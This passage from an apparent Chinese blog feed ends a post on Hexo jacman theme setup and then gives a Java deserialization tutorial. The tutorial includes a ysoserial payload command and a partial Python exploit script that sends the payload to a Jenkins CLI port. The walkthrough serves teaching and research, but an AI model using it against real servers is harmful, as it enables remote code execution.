class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (theme.donate) &#123; %&gt;</span><br><span class="line">    &lt;!-- css --&gt;</span><br><span class="line">    &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">        .center &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">        .hidden &#123;</span><br><span class="line">            display: none;</span><br><span class="line">        &#125;</span><br><span class="line">        .donate_bar a.btn_donate&#123;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            width: 82px;</span><br><span class="line">            height: 82px;</span><br><span class="line">            background: url(&quot;http://7xsl28.com1.z0.glb.clouddn.com/btn_reward.gif&quot;) no-repeat;</span><br><span class="line">            _background: url(&quot;http://7xsl28.com1.z0.glb.clouddn.com/btn_reward.gif&quot;) no-repeat;</span><br><span class="line"></span><br><span class="line">            &lt;!-- http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif</span><br><span class="line">                 因为本 hexo 生成的博客所用的 theme 的 a:hover 带动画效果，</span><br><span class="line">                 为了在让打赏按钮显示效果正常 而 添加了以下几行 css，</span><br><span class="line">                 嵌入其它博客时不一定要它们。 --&gt;</span><br><span class="line">            -webkit-transition: background 0s;</span><br><span class="line">            -moz-transition: background 0s;</span><br><span class="line">            -o-transition: background 0s;</span><br><span class="line">            -ms-transition: background 0s;</span><br><span class="line">            transition: background 0s;</span><br><span class="line">            &lt;!-- /让打赏按钮的效果显示正常 而 添加的几行 css 到此结束 --&gt;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .donate_bar a.btn_donate:hover&#123; background-position: 0px -82px;&#125;</span><br><span class="line">        .donate_bar .donate_txt &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            color: #9d9d9d;</span><br><span class="line">            font: 14px/2 &quot;Microsoft Yahei&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        .bold&#123; font-weight: bold; &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;!-- /css --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Donate Module --&gt;</span><br><span class="line">    &lt;div id=&quot;donate_module&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- btn_donate &amp; tips --&gt;</span><br><span class="line">    &lt;div id=&quot;donate_board&quot; class=&quot;donate_bar center&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        ------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;a id=&quot;btn_donate&quot; class=&quot;btn_donate&quot; target=&quot;_self&quot; href=&quot;javascript:;&quot; title=&quot;Donate 打赏&quot;&gt;&lt;/a&gt;</span><br><span class="line">        &lt;span class=&quot;donate_txt&quot;&gt;</span><br><span class="line">            &lt;%= theme.donate.text %&gt;</span><br><span class="line">        &lt;/span&gt;</span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;!-- /btn_donate &amp; tips --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- donate guide --&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;div id=&quot;donate_guide&quot; class=&quot;donate_bar center hidden&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        ------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;% if(theme.donate.web) &#123; %&gt;</span><br><span class="line">        &lt;div width=&quot;100%&quot; align=&quot;center&quot;&gt;&lt;div name=&quot;dashmain&quot; id=&quot;dash-main-id-87895f&quot; class=&quot;dash-main-3 87895f-0.99&quot;&gt;&lt;/div&gt;&lt;/div&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; src=&quot;http://www.dashangcloud.com/static/ds.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line"></span><br><span class="line">        &lt;a href=&quot;&lt;%= theme.donate.wechat %&gt;&quot; title=&quot;用微信扫一扫哦~&quot; class=&quot;fancybox&quot; rel=&quot;article0&quot;&gt;</span><br><span class="line">            &lt;img src=&quot;&lt;%= theme.donate.wechat %&gt;&quot; title=&quot;微信打赏 Donate&quot; height=&quot;190px&quot; width=&quot;auto&quot;/&gt;</span><br><span class="line">        &lt;/a&gt;</span><br><span class="line">        </span><br><span class="line">          </span><br><span class="line"></span><br><span class="line">        &lt;a href=&quot;&lt;%= theme.donate.alipay %&gt;&quot; title=&quot;用支付宝扫一扫即可~&quot; class=&quot;fancybox&quot; rel=&quot;article0&quot;&gt;</span><br><span class="line">            &lt;img src=&quot;&lt;%= theme.donate.alipay %&gt;&quot; title=&quot;支付宝打赏 Donate&quot; height=&quot;190px&quot; width=&quot;auto&quot;/&gt;</span><br><span class="line">        &lt;/a&gt;</span><br><span class="line"></span><br><span class="line">        &lt;span class=&quot;donate_txt&quot;&gt;</span><br><span class="line">            &lt;%= theme.donate.text %&gt;</span><br><span class="line">        &lt;/span&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;!-- /donate guide --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- donate script --&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        document.getElementById(&apos;btn_donate&apos;).onclick = function() &#123;</span><br><span class="line">            $(&apos;#donate_board&apos;).addClass(&apos;hidden&apos;);</span><br><span class="line">        $(&apos;#donate_guide&apos;).removeClass(&apos;hidden&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function donate_on_web()&#123;</span><br><span class="line">            $(&apos;#donate&apos;).submit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var original_window_onload = window.onload;</span><br><span class="line">        window.onload = function () &#123;</span><br><span class="line">            if (original_window_onload) &#123;</span><br><span class="line">                original_window_onload();</span><br><span class="line">            &#125;</span><br><span class="line">            document.getElementById(&apos;donate_board_wdg&apos;).className = &apos;hidden&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;!-- /donate script --&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;!-- /Donate Module --&gt;</span><br><span class="line">   &lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><h4 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h4><p>多说，网易云跟帖等挂掉，留给我为数不多的选择有gitment、来必力、disqus。</p><ul><li>disqus评论需要翻墙，在theme目录下的_config.yml填写disqus_shortname，就是disqus 的用户名，登录<a href="https://disqus.com/" target="_blank" rel="noopener">disqus</a>，注册，get started –&gt; I want to install Disqus on my site –&gt; Website Name就是disqus_shortname。</li><li>来必力很好用，韩国的，国内可用，支持图片，可以数据统计，邮件通知应有尽有，登录<a href="https://livere.com/" target="_blank" rel="noopener">livere</a>，注册，头像 –&gt; 管理页面 –&gt; 生成JS代码：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 来必力City版安装代码 --&gt;</span><br><span class="line">&lt;div id=&quot;lv-container&quot; data-id=&quot;city&quot; data-uid=&quot;xxxxxxx&quot;&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">   (function(d, s) &#123;</span><br><span class="line">       var j, e = d.getElementsByTagName(s)[0];</span><br><span class="line"></span><br><span class="line">       if (typeof LivereTower === &apos;function&apos;) &#123; return; &#125;</span><br><span class="line"></span><br><span class="line">       j = d.createElement(s);</span><br><span class="line">       j.src = &apos;https://cdn-city.livere.com/js/embed.dist.js&apos;;</span><br><span class="line">       j.async = true;</span><br><span class="line"></span><br><span class="line">       e.parentNode.insertBefore(j, e);</span><br><span class="line">   &#125;)(document, &apos;script&apos;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;noscript&gt;为正常使用来必力评论功能请激活JavaScript&lt;/noscript&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;!-- City版安装代码已完成 --&gt;</span><br></pre></td></tr></table></figure><p>在themes\jacman\layout_partial\post\article.ejs中    <strong>&lt;%- partial(‘pagination’) %&gt;</strong> 和 <strong>&lt;%- partial(‘comment’) %&gt;</strong> 中间暴力插入JS代码即可。如果有多个评论插件，可以在themes\jacman\layout_partial\post\comment.ejs中类似的加入判断条件。</p><ul><li>Gitment<br>还没试，参考<a href="http://xintq.net/2017/05/02/use-gitment-for-comment/" target="_blank" rel="noopener">这个</a>，将来如果来必力挂掉再说吧。</li></ul><p>参考链接：</p><pre><code>http://wuchong.me/blog/2014/11/20/how-to-use-jacman/</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;博客迁移及jacman主题配置的一些技巧&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="博客" scheme="https://michaelwayneliu.github.io/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="博客迁移" scheme="https://michaelwayneliu.github.io/tags/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/"/>
    
      <category term="jacman主题配置" scheme="https://michaelwayneliu.github.io/tags/jacman%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化漏洞</title>
    <link href="https://michaelwayneliu.github.io/2017/03/06/java/"/>
    <id>https://michaelwayneliu.github.io/2017/03/06/java/</id>
    <published>2017-03-06T13:54:47.000Z</published>
    <updated>2017-03-06T13:56:43.253Z</updated>
    
    <content type="html"><![CDATA[<p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中，也便于进行网络传输；反序列化即逆过程，由字节流还原成对象。<br><a id="more"></a></p><h4 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h4><p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中，也便于进行网络传输；反序列化即逆过程，由字节流还原成对象。大多数编程语言都提供内置的方法来实现这两个过程。Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectInputStream类的readObject()方法用于反序列化。<br><img src="http://p1.bqimg.com/567571/2224a823829b8146.png" alt="image"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//用来序列化的对象</span></span><br><span class="line">        String name = <span class="string">"bob"</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//把序列化数据写到"name.ser"这个文件里</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"name.ser"</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(name);</span><br><span class="line">        os.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//从"name.ser"里读取序列化数据</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"name.ser"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//从数据流里读取对象，把它恢复为字符串</span></span><br><span class="line">        String nameFromDisk = (String)ois.readObject();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//打印字符串</span></span><br><span class="line">        System.out.println(nameFromDisk);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">breens@us-l-breens:~/Desktop/SerialTest$ java SerializeTest</span><br><span class="line">bob</span><br><span class="line">breens@us-l-breens:~/Desktop/SerialTest$ xxd name.ser</span><br><span class="line">0000000: aced 0005 7400 0362 6f62 ....t..bob</span><br></pre></td></tr></table></figure><p>可以看到”name.ser”里的字符串可以被人眼识别，但其他信息已经被转换为二进制数据了。注意文件开头的“<strong>aced 0005</strong>”，这表示一切序列化后的java对象开头的两个字节。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//用来序列化的对象</span></span><br><span class="line">        MyObject myObj = <span class="keyword">new</span> MyObject();</span><br><span class="line">        myObj.name = <span class="string">"bob"</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//把序列化数据写到"name.ser"这个文件里</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//从"name.ser"里读取序列化数据</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//从数据流里读取对象，把它恢复为字符串</span></span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//打印字符串</span></span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="keyword">this</span>.name+<span class="string">"!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">breens@us-l-breens:~/Desktop/SerialTest$ java SerializeTest</span><br><span class="line">bob!</span><br><span class="line">breens@us-l-breens:~/Desktop/SerialTest$ xxd object.ser</span><br><span class="line">0000000: aced 0005 7372 0008 4d79 4f62 6a65 6374 ....sr..MyObject</span><br><span class="line">0000010: cf7a 75c5 5dba f698 0200 014c 0004 6e61 .zu.]......L..na</span><br><span class="line">0000020: 6d65 7400 124c 6a61 7661 2f6c 616e 672f met..Ljava/lang/</span><br><span class="line">0000030: 5374 7269 6e67 3b78 7074 0003 626f 62 String;xpt..bob</span><br></pre></td></tr></table></figure><p>这里“MyObject”实现了“Serializable”接口，自定义了一个方法“readObject”。<br>最后输出的字符串为“bob!”，而“object.ser”文件中字符串仍然为“bob”。由此可知，在java读取完字节流后，会判断是否存在用户自定义的“readObject”方法，如果存在的话，就优先使用udf。<br>所以，如果存在一个自定义了“readObject”方法的对象，而这个方法是危险的，比如说执行系统命令，就会导致反序列化后形成威胁。   </p><h4 id="0x01-漏洞寻找方法"><a href="#0x01-漏洞寻找方法" class="headerlink" title="0x01 漏洞寻找方法"></a>0x01 漏洞寻找方法</h4><p>反序列化漏洞存在于commons-collections这个java类库之中，而这个类库到处都在用。。          </p><ol><li>到应用程序的安装目录下。</li><li>看程序是不是和“commons-collections”类库绑定。因为该漏洞和一个类“InvokerTransformer”有关，所以直接<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@us-l-breens:~# cd /opt/OracleHome/</span><br><span class="line">root@us-l-breens:/opt/OracleHome# grep -R InvokerTransformer .</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685824694_jenkins.war/META-INF/.WL_internal/cache/jenkins.war/.classinfos/.cache.ser matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685824694_jenkins.war/WEB-INF/lib/commons-collections-<span class="number">3.2</span>.1.jar matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/_WL_user/jenkins/tw9byh/META-INF/.WL_internal/cache/jenkins.war/.classinfos/.cache.ser matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/_WL_user/jenkins/<span class="number">3</span>c5quy/war/WEB-INF/lib/commons-collections-<span class="number">3.2</span>.1.jar matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685776500_jenkins.war/META-INF/.WL_internal/cache/jenkins.war/.classinfos/.cache.ser matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685776500_jenkins.war/WEB-INF/lib/commons-collections-<span class="number">3.2</span>.1.jar matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685837432_jenkins.war/META-INF/.WL_internal/cache/jenkins.war/.classinfos/.cache.ser matches</span><br><span class="line">Binary file ./servers/AdminServer/tmp/.appmergegen_1446685837432_jenkins.war/WEB-INF/lib/commons-collections-<span class="number">3.2</span>.1.jar matches</span><br><span class="line">Binary file ./oracle_common/modules/com.bea.core.apache.commons.collections.jar matches</span><br><span class="line">Binary file ./oracle_common/modules/com.bea.core.apache.commons.collections.jar.bck matches</span><br></pre></td></tr></table></figure></li></ol><p>到这里只要程序运行时确实是使用了这个jar文件的，攻击就很可能有效。</p><ol><li>寻找程序把序列化对象当做输入的点。<br><img src="https://foxglovesecurity.files.wordpress.com/2015/10/objectexample.png" alt="image"></li></ol><p>上面是两个序列化的java对象，其中一个经过了base64编码，以“rO0AB”开头；另外一个以“ac ed 00 05 ”开头，未经过base64编码，是二进制数据。<br>如果序列化对象作为参数或者cookie经http协议传送，它会被base64编码，此时就注意“rO0AB”字符。但更常见的情况是序列化对象通过其他协议在各种各样的端口上进行传送。这时就需要列出程序监听的端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@us-l-breens:/opt# lsof -i -P | grep java | grep LISTEN</span><br><span class="line">java       6923            root   53u  IPv6 2136625      0t0  TCP *:8080 (LISTEN)</span><br><span class="line">java       6923            root   58u  IPv6 2136629      0t0  TCP *:8009 (LISTEN)</span><br><span class="line">java       6923            root  125u  IPv6 2138434      0t0  TCP localhost:8005 (LISTEN)</span><br><span class="line">java       6923            root  268u  IPv6 2138692      0t0  TCP *:33758 (LISTEN)</span><br><span class="line">java       6923            root  272u  IPv6 2137594      0t0  TCP *:53289 (LISTEN)</span><br></pre></td></tr></table></figure></p><p>接下来便是利用这些端口。试着找一下程序自带的一些脚本或者命令行工具，以此来用Wireshark观察发包收包，像是Jenkins, WebLogic, WebSphere等等都有相应的传送序列化对象的命令行工具。                   </p><ol><li>从<a href="http://note.youdao.com/" target="_blank" rel="noopener">github</a>下载工具“ysoserial”，运行生成对应payload。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar /path/to/ysoserial-<span class="number">0.0</span>.2-SNAPSHOT-all.jar CommonsCollections1 <span class="string">'touch /tmp/pwned'</span> &gt; payload.out</span><br></pre></td></tr></table></figure></li></ol><p>然后使用payload取代对应包中的序列化对象来构造发包。</p><h4 id="0x02-实战jenkins"><a href="#0x02-实战jenkins" class="headerlink" title="0x02 实战jenkins"></a>0x02 实战jenkins</h4><ol><li>我把应用放在Tomcat里，查找它是否有漏洞库的备份。<br><img src="http://p1.bqimg.com/4851/05a5b0e02164fed3.png" alt="image"></li><li>用“lsof”来看下哪些进程和java相关（有不认识的端口谷歌之）。发现目录“./webapps/jenkins/WEB-INF/”下的工具“jenkins-cli.jar”，是个命令行工具。<br><img src="http://p1.bqimg.com/4851/efbac6948d951935.png" alt="image"></li><li>使用wirshark抓包，观察CLI客户端使用何种协议发包收包，找到序列化对象的位置。<br><img src="http://i1.piimg.com/567571/6e28055c5c0cc1a8.png" alt="image"><br><img src="http://p1.bqimg.com/567571/c3b6dec1e8fd2089.png" alt="image"><br>协议大概为：先由CLI客户端发向服务端说明协议类型<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000000  00 14 50 72 6f 74 6f 63  6f 6c 3a 43 4c 49 2d 63 ..Protoc ol:CLI-c</span><br><span class="line">00000010  6f 6e 6e 65 63 74                                onnect</span><br></pre></td></tr></table></figure></li></ol><p>从服务端读取请求。接着便可以发送第二个包，包里包含了序列化对象，可以对它们进行替换构造发包。                                           </p><ol><li>利用python构造发包。<br>利用工具<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>生成payload<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span>.2-SNAPSHOT-all.jar CommonsCollections1 <span class="string">'touch /tmp/pwned'</span> &gt; payload.out</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#usage: ./jenkins.py host port /path/to/payload</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">port = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过HTTP访问jenkins，看服务端是在哪个端口监听CLI发送请求。</span></span><br><span class="line">r = requests.get(<span class="string">'http://'</span>+host+<span class="string">':'</span>+port)</span><br><span class="line">cli_port = int(r.headers[<span class="string">'X-Jenkins-CLI-Port'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#找到CLI对应的端口并进行TCP连接</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">server_address = (host, cli_port)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'connecting to %s port %s'</span> % server_address</span><br><span class="line">sock.connect(server_address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送第一个包，说明协议类型</span></span><br><span class="line">headers=<span class="string">'\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'sending "%s"'</span> % headers</span><br><span class="line">sock.send(headers)</span><br><span class="line"></span><br><span class="line">data = sock.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> &gt;&gt;sys.stderr, <span class="string">'received "%s"'</span> % data</span><br><span class="line"></span><br><span class="line">data = sock.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> &gt;&gt;sys.stderr, <span class="string">'received "%s"'</span> % data</span><br><span class="line"><span class="comment">#返回两个包，收两次</span></span><br><span class="line">payloadObj = open(sys.argv[<span class="number">3</span>],<span class="string">'rb'</span>).read()</span><br><span class="line">payload_b64 = base64.b64encode(payloadObj)</span><br><span class="line">payload=<span class="string">'\x3c\x3d\x3d\x3d\x5b\x4a\x45\x4e\x4b\x49\x4e\x53\x20\x52\x45\x4d\x4f\x54\x49\x4e\x47\x20\x43\x41\x50\x41\x43\x49\x54\x59\x5d\x3d\x3d\x3d\x3e'</span>+payload_b64+<span 